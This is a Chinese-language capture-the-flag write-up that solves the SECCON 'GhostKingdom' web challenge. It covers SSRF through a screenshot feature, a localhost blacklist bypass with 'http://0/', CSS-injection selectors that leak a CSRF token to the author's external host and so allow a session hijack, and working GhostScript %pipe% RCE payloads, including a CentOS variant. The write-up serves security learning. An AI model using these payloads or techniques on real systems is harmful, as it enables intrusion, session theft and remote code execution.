# GhostKingdom

Web分類中唯一的題目

點開題目，會看到他說flag在目錄`/FLAG`底下，但檔名不知道

題目有三個功能:

1. send message給admin
2. screenshot指定的網址
3. 上傳圖片 (但只有localhost才能，看不到網址)

而send message的地方可以發現能注入任意css (base64 encoded)

另外screenshot的地方可以SSRF，能夠透過截圖送request到localhost

只是這邊不能直接打http://127.0.0.1之類的，有黑名單，但可以簡單繞過: `http://0/`

![](https://i.imgur.com/771eldM.png)

可以看到訪問`http://0/`，上面的來源變成`localhost`

另外能觀察到，他幾乎大部份操作都是透過GET完成，所以透過截圖功能甚至可以做到登入、Send Message

登入:

`http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2f%2f0%2f%2f%3Fuser%3Dkaibro%26pass%3Dggininder%26action%3Dlogin&action=sshot2`

Send Message:

`http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2f%2f0%2f%3Fcss%3D%26msg%3Dtest%26action%3Dmsgadm2&action=sshot2`

到這邊看似沒辦法下一步，因為沒辦法XSS，css injection偷到csrf token也不知道能做啥，似乎也沒其他利用的方式

但其實題目有個關鍵點，他的session id和csrf token其實是一樣的...

所以我們透過CSS Injection偷到CSRF Token後，就能以相當於localhost的身份登入了

CSS Injection:

`input[name=csrf][value^="2"]{background: url(http://kaibro.tw/2)}`

`input[name=csrf][value^="2e"]{background: url(http://kaibro.tw/2e)}`

...

透過此種方式，就能慢慢爆出來CSRF Token

最後拿到CSRF Token，就能替換我們自己的Session id

![](https://i.imgur.com/vCl5zSu.png)

可以看到上傳圖片的action為`upl0ad`

後面就蠻明顯要我們用GhostScript漏洞去RCE

![](https://i.imgur.com/sYIQ2Og.png)

傳完圖片可以做GIF轉檔

從網址也可以明顯看到，他使用GhostMagick

但傳了我平常最常用的Payload上去

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%sleep 10') currentdevice putdeviceprops
```

發現不能Work，Reverseshell和DNS都沒回來

![](https://i.imgur.com/9QVruDU.png)

後來跑去翻payload

才發現CentOS版本的payload不太一樣:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%sleep 10) currentdevice putdeviceprops
```

於是就成功RCE了，接著就去讀`/FLAG/`下面的檔名

`ls /var/www/html/FLAG > /var/www/html/images/kaibro.secret`

![](https://i.imgur.com/idxCIIu.png)

flag檔名為`FLAGflagF1A8.txt`

![](https://i.imgur.com/Zddz7z1.png)


